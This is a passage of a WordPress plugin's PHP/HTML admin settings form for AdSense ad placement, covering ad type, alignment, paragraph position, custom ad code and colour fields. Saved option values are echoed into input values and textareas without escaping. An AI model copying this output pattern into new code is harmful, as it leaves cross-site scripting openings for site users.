<option value="mediumrectangle" <?php if (get_option('adsense_made_easy_topadtype')=='mediumrectangle') echo ' selected ' ?> >Medium Rectangle (300*250)</option>
<option value="rectangle" <?php if (get_option('adsense_made_easy_topadtype')=='rectangle') echo ' selected ' ?> >Large Rectangle (336*280)</option>
<option value="halfbanner" <?php if (get_option('adsense_made_easy_topadtype')=='halfbanner') echo ' selected ' ?> >Half Banner (234*60)</option>
<option value="banner" <?php if (get_option('adsense_made_easy_topadtype')=='banner') echo ' selected ' ?> >Banner (468*60)</option>
<option value="leaderboard" <?php if (get_option('adsense_made_easy_topadtype')=='leaderboard') echo ' selected ' ?> >Leaderboard (728*90)</option>
<option value="largeleaderboard" <?php if (get_option('adsense_made_easy_topadtype')=='largeleaderboard') echo ' selected ' ?> >Large Leaderboard (970*90)</option>
<option value="customcode" <?php if (get_option('adsense_made_easy_topadtype')=='customcode') echo ' selected ' ?> >Custom Code</option>
<option value="none" <?php if (get_option('adsense_made_easy_topadtype')=='none') echo ' selected ' ?> >None (No add will be shown)</option>
</select> The type of ad you want on top of your posts/pages?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Top ad alignment </th>
<td width="600">
<select name="adsense_made_easy_topadalignment" id="adsense_made_easy_topadalignment">
<option value="left" <?php if (get_option('adsense_made_easy_topadalignment')=='left') echo ' selected ' ?> >Left</option>
<option value="right" <?php if (get_option('adsense_made_easy_topadalignment')=='right') echo ' selected ' ?> >Right</option>
<option value="centered" <?php if (get_option('adsense_made_easy_topadalignment')=='centered') echo ' selected ' ?> >Centered</option>
</select> Do you want the top ad to be a aligned left, right or centered?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Top ad Image or Text </th>
<td width="600">
<select name="adsense_made_easy_topadtextimage" id="adsense_made_easy_topadtextimage">
<option value="text" <?php if (get_option('adsense_made_easy_topadtextimage')=='text') echo ' selected ' ?> >Text</option>
<option value="image" <?php if (get_option('adsense_made_easy_topadtextimage')=='image') echo ' selected ' ?> >Image</option>
<option value="both" <?php if (get_option('adsense_made_easy_topadtextimage')!='text' && get_option('adsense_made_easy_topadtextimage')!='image') echo ' selected ' ?> >Both</option>
</select>
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Top link unit? </th>
<td width="600">
<select name="adsense_made_easy_toplinkunit" id="adsense_made_easy_toplinkunit">
<option value="yes" <?php if (get_option('adsense_made_easy_toplinkunit')=='yes') echo ' selected ' ?> >Yes</option>
<option value="no" <?php if (get_option('adsense_made_easy_toplinkunit')=='no') echo ' selected ' ?> >No</option>
</select> Do you want a horizontal link unit on the top of the content?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Top Ad - Custom Code </th>
<td width="600">
<textarea name="adsense_made_easy_topcustomcode" id="adsense_made_easy_topcustomcode" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('adsense_made_easy_topcustomcode'); ?></textarea>
<BR>
Copy and Paste your Adsense Code here, don't forget your ad type must be set to Custom Code.
</td>
</tr>
</table>
<BR><BR>
<HR>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Middle ad type </th>
<td width="600">
<select name="adsense_made_easy_middleadtype" id="adsense_made_easy_middleadtype">
<option value="smallsquare" <?php if (get_option('adsense_made_easy_middleadtype')=='smallsquare') echo ' selected ' ?> >Small Square (200*200)</option>
<option value="square" <?php if (get_option('adsense_made_easy_middleadtype')=='square') echo ' selected ' ?> >Square (250*250)</option>
<option value="smallrectangle" <?php if (get_option('adsense_made_easy_middleadtype')=='smallrectangle') echo ' selected ' ?> >Small Rectangle (180*150)</option>
<option value="mediumrectangle" <?php if (get_option('adsense_made_easy_middleadtype')=='mediumrectangle') echo ' selected ' ?> >Medium Rectangle (300*250)</option>
<option value="rectangle" <?php if (get_option('adsense_made_easy_middleadtype')=='rectangle') echo ' selected ' ?> >Large Rectangle (336*280)</option>
<option value="halfbanner" <?php if (get_option('adsense_made_easy_middleadtype')=='halfbanner') echo ' selected ' ?> >Half Banner (234*60)</option>
<option value="banner" <?php if (get_option('adsense_made_easy_middleadtype')=='banner') echo ' selected ' ?> >Banner (468*60)</option>
<option value="leaderboard" <?php if (get_option('adsense_made_easy_middleadtype')=='leaderboard') echo ' selected ' ?> >Leaderboard (728*90)</option>
<option value="largeleaderboard" <?php if (get_option('adsense_made_easy_middleadtype')=='largeleaderboard') echo ' selected ' ?> >Large Leaderboard (970*90)</option>
<option value="customcode" <?php if (get_option('adsense_made_easy_middleadtype')=='customcode') echo ' selected ' ?> >Custom Code</option>
<option value="none" <?php if (get_option('adsense_made_easy_middleadtype')=='none') echo ' selected ' ?> >None (No add will be shown)</option>
</select> The type of ad you want in the middle of your posts/pages?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Middle ad alignment </th>
<td width="600">
<select name="adsense_made_easy_middleadalignment" id="adsense_made_easy_middleadalignment">
<option value="left" <?php if (get_option('adsense_made_easy_middleadalignment')=='left') echo ' selected ' ?> >Left</option>
<option value="right" <?php if (get_option('adsense_made_easy_middleadalignment')=='right') echo ' selected ' ?> >Right</option>
<option value="centered" <?php if (get_option('adsense_made_easy_middleadalignment')=='centered') echo ' selected ' ?> >Centered</option>
</select> Do you want the middle ad to be a aligned left, right or centered?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Middle ad Image or Text </th>
<td width="600">
<select name="adsense_made_easy_middleadtextimage" id="adsense_made_easy_middleadtextimage">
<option value="text" <?php if (get_option('adsense_made_easy_middleadtextimage')=='text') echo ' selected ' ?> >Text</option>
<option value="image" <?php if (get_option('adsense_made_easy_middleadtextimage')=='image') echo ' selected ' ?> >Image</option>
<option value="both" <?php if (get_option('adsense_made_easy_middleadtextimage')!='text' && get_option('adsense_made_easy_middleadtextimage')!='image') echo ' selected ' ?> >Both</option>
</select>
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Middle Ad - Custom Code </th>
<td width="600">
<textarea name="adsense_made_easy_middlecustomcode" id="adsense_made_easy_middlecustomcode" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('adsense_made_easy_middlecustomcode'); ?></textarea>
<BR>
Copy and Paste your Adsense Code here, don't forget your middle ad type must be set to Custom Code to work.
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Insert after paragraph: </th>
<td width="600">
<select name="adsense_made_easy_middleparagraph" id="adsense_made_easy_middleparagraph">
<option value="1" <?php if (get_option('adsense_made_easy_middleparagraph')=='1') echo ' selected ' ?> >1</option>
<option value="2" <?php if (get_option('adsense_made_easy_middleparagraph')=='2') echo ' selected ' ?> >2</option>
<option value="3" <?php if (get_option('adsense_made_easy_middleparagraph')=='3') echo ' selected ' ?> >3</option>
<option value="4" <?php if (get_option('adsense_made_easy_middleparagraph')=='4') echo ' selected ' ?> >4</option>
<option value="5" <?php if (get_option('adsense_made_easy_middleparagraph')=='5') echo ' selected ' ?> >5</option>
</select> After which paragraph do you want to have the ad inserted?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Minimum Word Count: </th>
<td width="600">
<select name="adsense_made_easy_middlewordcount" id="adsense_made_easy_middlewordcount">
<option value="0" <?php if (get_option('adsense_made_easy_middlewordcount')=='0') echo ' selected ' ?> >0</option>
<option value="100" <?php if (get_option('adsense_made_easy_middlewordcount')=='100') echo ' selected ' ?> >100</option>
<option value="200" <?php if (get_option('adsense_made_easy_middlewordcount')=='200') echo ' selected ' ?> >200</option>
<option value="300" <?php if (get_option('adsense_made_easy_middlewordcount')=='300') echo ' selected ' ?> >300</option>
<option value="400" <?php if (get_option('adsense_made_easy_middlewordcount')=='400') echo ' selected ' ?> >400</option>
<option value="500" <?php if (get_option('adsense_made_easy_middlewordcount')=='500') echo ' selected ' ?> >500</option>
<option value="600" <?php if (get_option('adsense_made_easy_middlewordcount')=='600') echo ' selected ' ?> >600</option>
<option value="700" <?php if (get_option('adsense_made_easy_middlewordcount')=='700') echo ' selected ' ?> >700</option>
<option value="800" <?php if (get_option('adsense_made_easy_middlewordcount')=='800') echo ' selected ' ?> >800</option>
<option value="900" <?php if (get_option('adsense_made_easy_middlewordcount')=='900') echo ' selected ' ?> >900</option>
<option value="1000" <?php if (get_option('adsense_made_easy_middlewordcount')=='1000') echo ' selected ' ?> >1000</option>
<option value="1500" <?php if (get_option('adsense_made_easy_middlewordcount')=='1500') echo ' selected ' ?> >1500</option>
</select> Mininum number of word count of the article to display this ad?
</td>
</tr>
</table>

<BR><BR>
<HR>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Bottom ad type </th>
<td width="600">
<select name="adsense_made_easy_bottomadtype" id="adsense_made_easy_bottomadtype">
<option value="smallsquare" <?php if (get_option('adsense_made_easy_bottomadtype')=='smallsquare') echo ' selected ' ?> >Small Square (200*200)</option>
<option value="square" <?php if (get_option('adsense_made_easy_bottomadtype')=='square') echo ' selected ' ?> >Square (250*250)</option>
<option value="smallrectangle" <?php if (get_option('adsense_made_easy_bottomadtype')=='smallrectangle') echo ' selected ' ?> >Small Rectangle (180*150)</option>
<option value="mediumrectangle" <?php if (get_option('adsense_made_easy_bottomadtype')=='mediumrectangle') echo ' selected ' ?> >Medium Rectangle (300*250)</option>
<option value="rectangle" <?php if (get_option('adsense_made_easy_bottomadtype')=='rectangle') echo ' selected ' ?> >Large Rectangle (336*280)</option>
<option value="halfbanner" <?php if (get_option('adsense_made_easy_bottomadtype')=='halfbanner') echo ' selected ' ?> >Half Banner (234*60)</option>
<option value="banner" <?php if (get_option('adsense_made_easy_bottomadtype')=='banner') echo ' selected ' ?> >Banner (468*60)</option>
<option value="leaderboard" <?php if (get_option('adsense_made_easy_bottomadtype')=='leaderboard') echo ' selected ' ?> >Leaderboard (728*90)</option>
<option value="largeleaderboard" <?php if (get_option('adsense_made_easy_bottomadtype')=='largeleaderboard') echo ' selected ' ?> >Large Leaderboard (970*90)</option>
<option value="customcode" <?php if (get_option('adsense_made_easy_bottomadtype')=='customcode') echo ' selected ' ?> >Custom Code</option>
<option value="none" <?php if (get_option('adsense_made_easy_bottomadtype')=='none') echo ' selected ' ?> >None (No add will be shown)</option>
</select> The type of ad you want on the bottom of your posts/pages?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Bottom ad Image or Text </th>
<td width="600">
<select name="adsense_made_easy_bottomadtextimage" id="adsense_made_easy_bottomadtextimage">
<option value="text" <?php if (get_option('adsense_made_easy_bottomadtextimage')=='text') echo ' selected ' ?> >Text</option>
<option value="image" <?php if (get_option('adsense_made_easy_bottomadtextimage')=='image') echo ' selected ' ?> >Image</option>
<option value="both" <?php if (get_option('adsense_made_easy_bottomadtextimage')!='text' && get_option('adsense_made_easy_bottomadtextimage')!='image') echo ' selected ' ?> >Both</option>
</select>
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Bottom link unit? </th>
<td width="600">
<select name="adsense_made_easy_bottomlinkunit" id="adsense_made_easy_bottomlinkunit">
<option value="yes" <?php if (get_option('adsense_made_easy_bottomlinkunit')=='yes') echo ' selected ' ?> >Yes</option>
<option value="no" <?php if (get_option('adsense_made_easy_bottomlinkunit')=='no') echo ' selected ' ?> >No</option>
</select> Do you want a horizontal link unit at the bottom of the content?
</td>
</tr>
</table>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Bot Ad - Custom Code </th>
<td width="600">
<textarea name="adsense_made_easy_botcustomcode" id="adsense_made_easy_botcustomcode" style="width:340px; height:220px; font-size:11px;" cols="" rows=""><?php echo get_option('adsense_made_easy_botcustomcode'); ?></textarea>
<BR>
Copy and Paste your Adsense Code here, don't forget your bottom ad type must be set to Custom Code.
</td>
</tr>
</table>
<BR><BR>
<HR>


<table width="850">
<tr valign="top">
<th width="250" scope="row">Display ads on posts? </th>
<td width="600">
<select name="adsense_made_easy_displayposts" id="adsense_made_easy_displayposts">
<option value="yes" <?php if (get_option('adsense_made_easy_displayposts')=='yes') echo ' selected ' ?> >yes</option>
<option value="no" <?php if (get_option('adsense_made_easy_displayposts')=='no') echo ' selected ' ?> >no</option>
</select>
</td>
</tr>
</table>
<table width="850">
<tr valign="top">
<th width="250" scope="row">Display ads on pages? </th>
<td width="600">
<select name="adsense_made_easy_displaypages" id="adsense_made_easy_displaypages">
<option value="yes" <?php if (get_option('adsense_made_easy_displaypages')=='yes') echo ' selected ' ?> >yes</option>
<option value="no" <?php if (get_option('adsense_made_easy_displaypages')=='no') echo ' selected ' ?> >no</option>
</select>
</td>
</tr>
</table>

<script type="text/javascript" src="<?php bloginfo( 'wpurl' ); ?>
/wp-content/plugins/adsense-made-easy-best-simple-ad-inserter/jscolor.js"></script>
<BR><BR><HR>
<b>Colors</b> (These don't apply if you use custom code)<BR>
<table width="850">
<tr valign="top">
<th width="250" scope="row">Bordercolor of the ads</th>
<td width="600">
<input class="color" name="adsense_made_easy_bordercolor" type="text" id="adsense_made_easy_bordercolor" value="<?php echo get_option('adsense_made_easy_bordercolor'); ?>" /></td>
</tr>
</table>
<table width="850">
<tr valign="top">
<th width="250" scope="row">Titlecolor (Link) of the ads</th>
<td width="600">
<input class="color" name="adsense_made_easy_titlecolor" type="text" id="adsense_made_easy_titlecolor" value="<?php echo get_option('adsense_made_easy_titlecolor'); ?>" /></td>
</tr>
</table>
<table width="850">
<tr valign="top">
<th width="250" scope="row">Backgroundcolor of the ads</th>
<td width="600">
<input class="color" name="adsense_made_easy_backgroundcolor" type="text" id="adsense_made_easy_backgroundcolor" value="<?php echo get_option('adsense_made_easy_backgroundcolor'); ?>" /></td>
</tr>
</table>
<table width="850">
<tr valign="top">
<th width="250" scope="row">Textcolor of the ads</th>
<td width="600">
<input class="color" name="adsense_made_easy_textcolor" type="text" id="adsense_made_easy_textcolor" value="<?php echo get_option('adsense_made_easy_textcolor'); ?>" /></td>
</tr>
</table>
<table width="850">
<tr valign="top">
<th width="250" scope="row">URLcolor of the ads </th>
<td width="600">
<input class="color" name="adsense_made_easy_urlcolor" type="text" id="adsense_made_easy_urlcolor" value="<?php echo get_option('adsense_made_easy_urlcolor'); ?>" /></td>
</tr>
</table>


<input type="hidden" name="action" value="update" />
<input type="hidden" name="page_options" value="adsense_made_easy_publisherid, adsense_made_easy_bordercolor, adsense_made_easy_titlecolor, adsense_made_easy_backgroundcolor, adsense_made_easy_textcolor, adsense_made_easy_urlcolor, adsense_made_easy_topadtype, adsense_made_easy_bottomadtype, adsense_made_easy_displayposts, adsense_made_easy_displaypages, adsense_made_easy_topadalignment, adsense_made_easy_topadtextimage, adsense_made_easy_bottomadtextimage, adsense_made_easy_toplinkunit, adsense_made_easy_bottomlinkunit, adsense_made_easy_topcustomcode, adsense_made_easy_botcustomcode, adsense_made_easy_middleadtype, adsense_made_easy_middleadtextimage, adsense_made_easy_middleadalignment, adsense_made_easy_middlecustomcode, adsense_made_easy_middleparagraph, adsense_made_easy_middlewordcount" />

<p>
<input type="submit" value="<?php _e('Save Changes') ?>" />
</p>
</form>
</div>
<BR><BR>
<?php
}
?>